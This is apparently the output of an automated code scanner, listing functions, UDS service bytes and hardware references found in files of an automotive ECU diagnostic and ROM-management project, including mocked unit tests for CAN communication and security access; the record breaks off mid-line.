{"file_path": "versa13.py", "lines_read": 459, "features_found": [{"type": "function", "name": "__init__", "line": 32}, {"type": "function", "name": "_initialize_services", "line": 48}, {"type": "function", "name": "execute_diagnostic_routine", "line": 81}, {"type": "function", "name": "_parse_readiness_codes", "line": 127}, {"type": "function", "name": "_parse_freeze_frame", "line": 152}, {"type": "function", "name": "_parse_component_test", "line": 174}, {"type": "function", "name": "_parse_clear_adaptations", "line": 192}, {"type": "function", "name": "_parse_turbo_test", "line": 204}, {"type": "function", "name": "_parse_fuel_system_test", "line": 221}, {"type": "function", "name": "_parse_ignition_test", "line": 239}, {"type": "function", "name": "perform_comprehensive_diagnostic", "line": 257}, {"type": "function", "name": "read_adaptive_values", "line": 289}, {"type": "function", "name": "reset_adaptive_memory", "line": 330}, {"type": "function", "name": "monitor_live_parameters", "line": 360}, {"type": "function", "name": "get_diagnostic_report", "line": 410}, {"type": "function", "name": "_get_vehicle_info", "line": 434}, {"type": "function", "name": "_generate_recommendation", "line": 450}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "..core.ecu_communication", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "DiagnosticService", "line": 18}, {"type": "class", "name": "DiagnosticManager", "line": 26}], "algorithms": [], "protocols": [{"type": "protocol", "line": 52, "protocol": "0x[0-9A-Fa-f]+", "content": "0x01, 0x01, \"Read System Readiness\","}, {"type": "protocol", "line": 56, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12, 0x00, \"Read Freeze Frame Data\","}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "0x31, 0x01, \"Component Active Test\","}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "0x31, 0xFF, \"Clear All Adaptations\","}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "0x31, 0x11, \"Turbocharger System Test\","}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "0x31, 0x12, \"Fuel System Test\","}, {"type": "protocol", "line": 76, "protocol": "0x[0-9A-Fa-f]+", "content": "0x31, 0x13, \"Ignition System Test\","}, {"type": "protocol", "line": 135, "protocol": "0x[0-9A-Fa-f]+", "content": "'catalyst': (readiness_byte >> 0) & 0x01,"}, {"type": "protocol", "line": 136, "protocol": "0x[0-9A-Fa-f]+", "content": "'heated_catalyst': (readiness_byte >> 1) & 0x01,"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "'evap_system': (readiness_byte >> 2) & 0x01,"}, {"type": "protocol", "line": 138, "protocol": "0x[0-9A-Fa-f]+", "content": "'secondary_air': (readiness_byte >> 3) & 0x01,"}, {"type": "protocol", "line": 139, "protocol": "0x[0-9A-Fa-f]+", "content": "'ac_system': (readiness_byte >> 4) & 0x01,"}, {"type": "protocol", "line": 140, "protocol": "0x[0-9A-Fa-f]+", "content": "'oxygen_sensor': (readiness_byte >> 5) & 0x01,"}, {"type": "protocol", "line": 141, "protocol": "0x[0-9A-Fa-f]+", "content": "'oxygen_sensor_heater': (readiness_byte >> 6) & 0x01,"}, {"type": "protocol", "line": 142, "protocol": "0x[0-9A-Fa-f]+", "content": "'egr_system': (readiness_byte >> 7) & 0x01"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "'test_status': 'PASS' if test_result == 0x00 else 'FAIL',"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "'system_status': 'NORMAL' if system_status == 0x00 else 'ABNORMAL',"}, {"type": "protocol", "line": 253, "protocol": "0x[0-9A-Fa-f]+", "content": "'system_status': 'NORMAL' if system_status == 0x00 else 'ABNORMAL',"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x22, 0x2100)  # Fuel trim learn values"}, {"type": "protocol", "line": 309, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x22, 0x2101)  # Knock learn values"}, {"type": "protocol", "line": 317, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x22, 0x2102)  # Throttle adaptation"}, {"type": "protocol", "line": 339, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x31, 0x04, b'\\xFF')  # Clear fuel adaptations"}, {"type": "protocol", "line": 344, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x31, 0x05, b'\\xFF')  # Clear knock learning"}, {"type": "protocol", "line": 349, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x31, 0x06, b'\\xFF')  # Clear throttle adaptation"}, {"type": "protocol", "line": 377, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x0C, 'rpm'),"}, {"type": "protocol", "line": 378, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x0D, 'speed'),"}, {"type": "protocol", "line": 379, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x11, 'throttle'),"}, {"type": "protocol", "line": 380, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x05, 'coolant_temp'),"}, {"type": "protocol", "line": 381, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x0F, 'intake_temp'),"}, {"type": "protocol", "line": 382, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x223365, 'boost'),"}, {"type": "protocol", "line": 383, "protocol": "0x[0-9A-Fa-f]+", "content": "(0x223456, 'knock_correction')"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 14, "hardware": "ECU", "content": "from ..core.ecu_communication import ECUCommunicator, ECUResponse"}, {"type": "hardware", "line": 32, "hardware": "ECU", "content": "def __init__(self, ecu_communicator: ECUCommunicator):"}, {"type": "hardware", "line": 37, "hardware": "ECU", "content": "ecu_communicator: ECUCommunicator instance"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.ecu = ecu_communicator"}, {"type": "hardware", "line": 81, "hardware": "ECU", "content": "def execute_diagnostic_routine(self, routine_name: str,"}, {"type": "hardware", "line": 84, "hardware": "ECU", "content": "Execute diagnostic routine"}, {"type": "hardware", "line": 97, "hardware": "ECU", "content": "self.logger.info(f\"Executing diagnostic routine: {service.description}\")"}, {"type": "hardware", "line": 101, "hardware": "ECU", "content": "response = self.ecu.send_request(service.service_id, service.subfunction, service.request_data)"}, {"type": "hardware", "line": 115, "hardware": "ECU", "content": "'error': f\"Service execution failed: {response.error_code:02X}\","}, {"type": "hardware", "line": 167, "hardware": "vehicle", "content": "'vehicle_speed': data[9],  # km/h"}, {"type": "hardware", "line": 259, "hardware": "vehicle", "content": "Perform comprehensive vehicle diagnostic"}, {"type": "hardware", "line": 276, "hardware": "ECU", "content": "test_result = self.execute_diagnostic_routine(routine_name)"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "response = self.ecu.send_request(0x22, 0x2100)  # Fuel trim learn values"}, {"type": "hardware", "line": 309, "hardware": "ECU", "content": "response = self.ecu.send_request(0x22, 0x2101)  # Knock learn values"}, {"type": "hardware", "line": 317, "hardware": "ECU", "content": "response = self.ecu.send_request(0x22, 0x2102)  # Throttle adaptation"}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "response = self.ecu.send_request(0x31, 0x04, b'\\xFF')  # Clear fuel adaptations"}, {"type": "hardware", "line": 344, "hardware": "ECU", "content": "response = self.ecu.send_request(0x31, 0x05, b'\\xFF')  # Clear knock learning"}, {"type": "hardware", "line": 349, "hardware": "ECU", "content": "response = self.ecu.send_request(0x31, 0x06, b'\\xFF')  # Clear throttle adaptation"}, {"type": "hardware", "line": 395, "hardware": "ECU", "content": "value = self.ecu.read_live_data(pid)"}, {"type": "hardware", "line": 419, "hardware": "vehicle", "content": "'vehicle_info': self._get_vehicle_info(),"}, {"type": "hardware", "line": 434, "hardware": "vehicle", "content": "def _get_vehicle_info(self) -> Dict[str, Any]:"}, {"type": "hardware", "line": 435, "hardware": "vehicle", "content": "\"\"\"Get basic vehicle information\"\"\""}, {"type": "hardware", "line": 437, "hardware": "ECU", "content": "vin = self.ecu.read_vin()"}], "security_logic": [{"type": "security_pattern", "line": 273, "pattern": "key", "content": "for routine_name in self.services.keys():"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa14.py", "lines_read": 537, "features_found": [{"type": "function", "name": "__init__", "line": 22}, {"type": "function", "name": "_create_directory_structure", "line": 40}, {"type": "function", "name": "save_rom_file", "line": 58}, {"type": "function", "name": "load_rom_file", "line": 108}, {"type": "function", "name": "_calculate_file_hash", "line": 144}, {"type": "function", "name": "create_backup", "line": 152}, {"type": "function", "name": "list_backups", "line": 192}, {"type": "function", "name": "restore_backup", "line": 230}, {"type": "function", "name": "save_tune_definition", "line": 253}, {"type": "function", "name": "load_tune_definition", "line": 288}, {"type": "function", "name": "list_tunes", "line": 314}, {"type": "function", "name": "export_tune_package", "line": 354}, {"type": "function", "name": "import_tune_package", "line": 424}, {"type": "function", "name": "get_storage_info", "line": 469}, {"type": "function", "name": "cleanup_old_files", "line": 506}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "shutil", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "zipfile", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}, {"type": "import", "module": "tune", "line": null}], "components_found": [{"type": "class", "name": "FileManager", "line": 16}], "algorithms": [{"type": "algorithm_function", "line": 144, "content": "def _calculate_file_hash(self, file_path: str) -> str:"}], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 10, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 83, "pattern": "hash", "content": "file_hash = self._calculate_file_hash(file_path)"}, {"type": "security_pattern", "line": 92, "pattern": "hash", "content": "'file_hash': file_hash,"}, {"type": "security_pattern", "line": 133, "pattern": "hash", "content": "current_hash = self._calculate_file_hash(file_path)"}, {"type": "security_pattern", "line": 134, "pattern": "hash", "content": "if metadata.get('file_hash') != current_hash:"}, {"type": "security_pattern", "line": 135, "pattern": "hash", "content": "self.logger.warning(\"ROM file hash mismatch - file may be corrupted\")"}, {"type": "security_pattern", "line": 144, "pattern": "hash", "content": "def _calculate_file_hash(self, file_path: str) -> str:"}, {"type": "security_pattern", "line": 145, "pattern": "hash", "content": "\"\"\"Calculate SHA256 hash of file\"\"\""}, {"type": "security_pattern", "line": 146, "pattern": "hash", "content": "sha256_hash = hashlib.sha256()"}, {"type": "security_pattern", "line": 149, "pattern": "hash", "content": "sha256_hash.update(byte_block)"}, {"type": "security_pattern", "line": 150, "pattern": "hash", "content": "return sha256_hash.hexdigest()"}, {"type": "security_pattern", "line": 178, "pattern": "hash", "content": "'hash': hashlib.sha256(rom_data).hexdigest()"}, {"type": "security_pattern", "line": 223, "pattern": "key", "content": "backups.sort(key=lambda x: x['modified'], reverse=True)"}, {"type": "security_pattern", "line": 347, "pattern": "key", "content": "tunes.sort(key=lambda x: x['name'])"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa15.py", "lines_read": 227, "features_found": [{"type": "function", "name": "__init__", "line": 20}, {"type": "function", "name": "compress_data", "line": 23}, {"type": "function", "name": "decompress_data", "line": 56}, {"type": "function", "name": "compress_and_encode", "line": 84}, {"type": "function", "name": "decode_and_decompress", "line": 99}, {"type": "function", "name": "optimize_rom_storage", "line": 114}, {"type": "function", "name": "restore_rom_data", "line": 151}, {"type": "function", "name": "create_differential_patch", "line": 177}, {"type": "function", "name": "apply_differential_patch", "line": 203}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "zlib", "line": null}, {"type": "import", "module": "lzma", "line": null}, {"type": "import", "module": "bz2", "line": null}, {"type": "import", "module": "base64", "line": null}, {"type": "import", "module": "Optional,", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "CompressionManager", "line": 14}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [{"type": "security_pattern", "line": 17, "pattern": "algorithm", "content": "Supports multiple compression algorithms for different use cases"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa16.json", "lines_read": 105, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa16.py", "lines_read": 532, "features_found": [{"type": "function", "name": "__init__", "line": 65}, {"type": "function", "name": "read_all_dtcs", "line": 76}, {"type": "function", "name": "_read_dtc_type", "line": 123}, {"type": "function", "name": "_parse_dtc_bytes", "line": 164}, {"type": "function", "name": "_create_dtc_info", "line": 193}, {"type": "function", "name": "_read_freeze_frame", "line": 220}, {"type": "function", "name": "_dtc_code_to_bytes", "line": 247}, {"type": "function", "name": "_parse_freeze_frame_data", "line": 277}, {"type": "function", "name": "clear_all_dtcs", "line": 314}, {"type": "function", "name": "clear_specific_dtc", "line": 342}, {"type": "function", "name": "_update_dtc_history", "line": 378}, {"type": "function", "name": "get_dtc_statistics", "line": 407}, {"type": "function", "name": "generate_dtc_report", "line": 463}, {"type": "function", "name": "_generate_recommendations", "line": 496}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "..core.ecu_communication", "line": null}, {"type": "import", "module": "..utils.logger", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "VersaLogger", "line": null}], "components_found": [{"type": "class", "name": "DTCInfo", "line": 17}, {"type": "class", "name": "DTCHandler", "line": 28}], "algorithms": [], "protocols": [{"type": "protocol", "line": 89, "protocol": "0x[0-9A-Fa-f]+", "content": "current_dtcs = self._read_dtc_type(0x01)  # Current DTCs"}, {"type": "protocol", "line": 95, "protocol": "0x[0-9A-Fa-f]+", "content": "pending_dtcs = self._read_dtc_type(0x02)  # Pending DTCs"}, {"type": "protocol", "line": 101, "protocol": "0x[0-9A-Fa-f]+", "content": "permanent_dtcs = self._read_dtc_type(0x0A)  # Permanent DTCs"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x19, dtc_type)"}, {"type": "protocol", "line": 148, "protocol": "0x[0-9A-Fa-f]+", "content": "if dtc_bytes[0] == 0x00 and dtc_bytes[1] == 0x00:"}, {"type": "protocol", "line": 181, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_type = (first_byte >> 6) & 0x03"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "digit1 = (first_byte >> 4) & 0x03"}, {"type": "protocol", "line": 183, "protocol": "0x[0-9A-Fa-f]+", "content": "digit2 = first_byte & 0x0F"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "digit3 = (second_byte >> 4) & 0x0F"}, {"type": "protocol", "line": 185, "protocol": "0x[0-9A-Fa-f]+", "content": "digit4 = second_byte & 0x0F"}, {"type": "protocol", "line": 237, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x12, 0x00, dtc_bytes)"}, {"type": "protocol", "line": 324, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x14, 0xFF)  # Clear all DTCs"}, {"type": "protocol", "line": 359, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu.send_request(0x14, 0x00, dtc_bytes)"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 13, "hardware": "ECU", "content": "from ..core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "'P0611': {'description': 'ECU Internal Control Module Memory Error', 'severity': 'Critical'},"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "'B1000': {'description': 'ECU Malfunction', 'severity': 'Critical'},"}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "'B1342': {'description': 'ECU Is Defective', 'severity': 'Critical'},"}, {"type": "hardware", "line": 61, "hardware": "TCM", "content": "'U0101': {'description': 'Lost Communication With TCM', 'severity': 'High'},"}, {"type": "hardware", "line": 65, "hardware": "ECU", "content": "def __init__(self, ecu_communicator: ECUCommunicator):"}, {"type": "hardware", "line": 70, "hardware": "ECU", "content": "ecu_communicator: ECUCommunicator instance"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "self.ecu = ecu_communicator"}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "Read all Diagnostic Trouble Codes from ECU"}, {"type": "hardware", "line": 83, "hardware": "ECU", "content": "self.logger.info(\"Reading all DTCs from ECU\")"}, {"type": "hardware", "line": 116, "hardware": "ECU", "content": "self.logger.info(f\"Read {len(dtcs)} DTCs from ECU\")"}, {"type": "hardware", "line": 137, "hardware": "ECU", "content": "response = self.ecu.send_request(0x19, dtc_type)"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "response = self.ecu.send_request(0x12, 0x00, dtc_bytes)"}, {"type": "hardware", "line": 295, "hardware": "vehicle", "content": "'vehicle_speed': data[9],  # km/h"}, {"type": "hardware", "line": 324, "hardware": "ECU", "content": "response = self.ecu.send_request(0x14, 0xFF)  # Clear all DTCs"}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "response = self.ecu.send_request(0x14, 0x00, dtc_bytes)"}], "security_logic": [{"type": "security_pattern", "line": 446, "pattern": "key", "content": "frequent_dtcs = sorted(self.dtc_history, key=lambda x: x.frequency, reverse=True)[:5]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa17.json", "lines_read": 106, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["versa"]}
{"file_path": "versa18.py", "lines_read": 314, "features_found": [{"type": "function", "name": "setUp", "line": 26}, {"type": "function", "name": "tearDown", "line": 40}, {"type": "function", "name": "test_initialization", "line": 46}, {"type": "function", "name": "test_connect_success", "line": 53}, {"type": "function", "name": "test_connect_failure", "line": 67}, {"type": "function", "name": "test_send_request_success", "line": 77}, {"type": "function", "name": "test_send_request_timeout", "line": 102}, {"type": "function", "name": "test_read_vin_success", "line": 117}, {"type": "function", "name": "test_read_dtcs", "line": 134}, {"type": "function", "name": "test_clear_dtcs", "line": 154}, {"type": "function", "name": "test_read_live_data", "line": 168}, {"type": "function", "name": "test_parse_dtc_code", "line": 184}, {"type": "function", "name": "test_message_listener_stop", "line": 200}, {"type": "function", "name": "setUp", "line": 214}, {"type": "function", "name": "test_security_level_1_algorithm", "line": 219}, {"type": "function", "name": "test_unlock_ecu_success", "line": 232}, {"type": "function", "name": "test_unlock_ecu_failure", "line": 245}, {"type": "function", "name": "setUp", "line": 260}, {"type": "function", "name": "test_rom_structure_definition", "line": 265}, {"type": "function", "name": "test_checksum_calculation", "line": 278}, {"type": "function", "name": "test_verify_checksums", "line": 292}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "unittest.mock", "line": null}, {"type": "import", "module": "src.core.ecu_communication", "line": null}, {"type": "import", "module": "src.core.security_access", "line": null}, {"type": "import", "module": "src.core.rom_operations", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "unittest", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "Mock,", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "ECUCommunicator,", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "ROMOperations", "line": null}], "components_found": [{"type": "class", "name": "TestECUCommunication", "line": 23}, {"type": "class", "name": "TestSecurityAccess", "line": 211}, {"type": "class", "name": "TestROMOperations", "line": 257}], "algorithms": [{"type": "algorithm_function", "line": 219, "content": "def test_security_level_1_algorithm(self):"}], "protocols": [{"type": "protocol", "line": 70, "protocol": "CAN", "content": "self.mock_bus_class.side_effect = Exception(\"CAN bus error\")"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "response_data = bytes([0x7E, 0x8, 0x62, 0xF1, 0x86, 0x4A, 0x31, 0x42, 0x4B, 0x31, 0x34, 0x33, 0x31, "}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E8,"}, {"type": "protocol", "line": 96, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_comm.send_request(0x22, 0xF186)  # Read VIN"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "response = self.ecu_comm.send_request(0x22, 0xF186)"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertEqual(response.error_code, 0x78)  # Timeout error code"}, {"type": "protocol", "line": 120, "protocol": "0x[0-9A-Fa-f]+", "content": "vin_response = bytes([0x7E, 0x8, 0x62, 0xF1, 0x89, 0x4A, 0x31, 0x42, 0x4B, 0x31, 0x34, 0x33, 0x31, 0"}, {"type": "protocol", "line": 132, "protocol": "0x[0-9A-Fa-f]+", "content": "mock_send.assert_called_once_with(0x22, 0xF189)"}, {"type": "protocol", "line": 137, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_response = bytes([0x7E, 0x8, 0x62, 0x02, 0x01, 0x03, 0x01, 0x04, 0x20, 0x00, 0x00, 0x00, 0x00])"}, {"type": "protocol", "line": 157, "protocol": "0x[0-9A-Fa-f]+", "content": "mock_send.return_value = ECUResponse(True, bytes([0x54]), 1234567890.0)"}, {"type": "protocol", "line": 166, "protocol": "0x[0-9A-Fa-f]+", "content": "mock_send.assert_called_once_with(0x14, 0xFF)"}, {"type": "protocol", "line": 171, "protocol": "0x[0-9A-Fa-f]+", "content": "rpm_response = bytes([0x7E, 0x8, 0x62, 0x0C, 0x2E, 0xE0])"}, {"type": "protocol", "line": 180, "protocol": "0x[0-9A-Fa-f]+", "content": "rpm = self.ecu_comm.read_live_data(0x0C)  # RPM PID"}, {"type": "protocol", "line": 180, "protocol": "PID", "content": "rpm = self.ecu_comm.read_live_data(0x0C)  # RPM PID"}, {"type": "protocol", "line": 182, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertEqual(rpm, 3000.0)  # (0x2E * 256 + 0xE0) / 4 = 3000"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_bytes = bytes([0x03, 0x01])"}, {"type": "protocol", "line": 192, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_bytes = bytes([0x43, 0x34])"}, {"type": "protocol", "line": 197, "protocol": "0x[0-9A-Fa-f]+", "content": "dtc_code = self.ecu_comm._parse_dtc_code(bytes([0x03]))"}, {"type": "protocol", "line": 221, "protocol": "0x[0-9A-Fa-f]+", "content": "seed = bytes([0x12, 0x34, 0x56, 0x78])"}, {"type": "protocol", "line": 235, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_response = ECUResponse(True, bytes([0x67, 0x01, 0x12, 0x34, 0x56, 0x78]), 1234567890.0)"}, {"type": "protocol", "line": 236, "protocol": "0x[0-9A-Fa-f]+", "content": "key_response = ECUResponse(True, bytes([0x67, 0x02]), 1234567890.0)"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "seed_response = ECUResponse(True, bytes([0x67, 0x01, 0x12, 0x34, 0x56, 0x78]), 1234567890.0)"}, {"type": "protocol", "line": 249, "protocol": "0x[0-9A-Fa-f]+", "content": "key_response = ECUResponse(False, bytes([0x7F, 0x27, 0x35]), 1234567890.0)  # Negative response"}, {"type": "protocol", "line": 275, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertEqual(structure['boot_sector'].size, 0x010000)"}, {"type": "protocol", "line": 276, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertEqual(structure['calibration_a'].size, 0x080000)"}, {"type": "protocol", "line": 285, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertEqual(crc32_result, 0x5B04C3D1)  # Pre-calculated value"}, {"type": "protocol", "line": 290, "protocol": "0x[0-9A-Fa-f]+", "content": "self.assertLessEqual(sum16_result, 0xFFFF)"}, {"type": "protocol", "line": 295, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data = bytearray(0x200000)  # 2MB ROM"}, {"type": "protocol", "line": 298, "protocol": "0x[0-9A-Fa-f]+", "content": "calibration_data = rom_data[0x010000:0x090000]"}, {"type": "protocol", "line": 300, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data[0x1FFFF0:0x1FFFF4] = crc32.to_bytes(4, 'big')"}, {"type": "protocol", "line": 303, "protocol": "0x[0-9A-Fa-f]+", "content": "boot_data = rom_data[0x000000:0x00FFFC]"}, {"type": "protocol", "line": 305, "protocol": "0x[0-9A-Fa-f]+", "content": "rom_data[0x00FFFC:0x00FFFE] = sum16.to_bytes(2, 'big')"}], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator, ECUResponse, ECUState"}, {"type": "hardware", "line": 6, "hardware": "ECU", "content": "Unit Tests for ECU Communication Module"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "Comprehensive testing of all ECU communication functionality"}, {"type": "hardware", "line": 19, "hardware": "ECU", "content": "from src.core.ecu_communication import ECUCommunicator, ECUResponse"}, {"type": "hardware", "line": 20, "hardware": "ECU", "content": "from src.core.security_access import SecurityManager"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "class TestECUCommunication(unittest.TestCase):"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "\"\"\"Test cases for ECU communication functionality\"\"\""}, {"type": "hardware", "line": 38, "hardware": "ECU", "content": "self.ecu_comm = ECUCommunicator()"}, {"type": "hardware", "line": 43, "hardware": "ECU", "content": "if hasattr(self.ecu_comm, 'bus') and self.ecu_comm.bus:"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "self.ecu_comm.disconnect()"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "\"\"\"Test ECUCommunicator initialization\"\"\""}, {"type": "hardware", "line": 48, "hardware": "ECU", "content": "self.assertEqual(self.ecu_comm.interface, 'can0')"}, {"type": "hardware", "line": 49, "hardware": "ECU", "content": "self.assertEqual(self.ecu_comm.bitrate, 500000)"}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "self.assertFalse(self.ecu_comm.is_connected)"}, {"type": "hardware", "line": 51, "hardware": "ECU", "content": "self.assertIsNotNone(self.ecu_comm.logger)"}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "\"\"\"Test successful connection to ECU\"\"\""}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='JM1BK143141123456'):"}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "result = self.ecu_comm.connect()"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "self.assertTrue(self.ecu_comm.is_connected)"}, {"type": "hardware", "line": 68, "hardware": "ECU", "content": "\"\"\"Test failed connection to ECU\"\"\""}, {"type": "hardware", "line": 70, "hardware": "CAN bus", "content": "self.mock_bus_class.side_effect = Exception(\"CAN bus error\")"}, {"type": "hardware", "line": 72, "hardware": "ECU", "content": "result = self.ecu_comm.connect()"}, {"type": "hardware", "line": 75, "hardware": "ECU", "content": "self.assertFalse(self.ecu_comm.is_connected)"}, {"type": "hardware", "line": 92, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 93, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "response = self.ecu_comm.send_request(0x22, 0xF186)  # Read VIN"}, {"type": "hardware", "line": 108, "hardware": "ECU", "content": "with patch.object(self.ecu_comm, 'read_vin', return_value='TESTVIN123456789'):"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "self.ecu_comm.connect()"}, {"type": "hardware", "line": 112, "hardware": "ECU", "content": "response = self.ecu_comm.send_request(0x22, 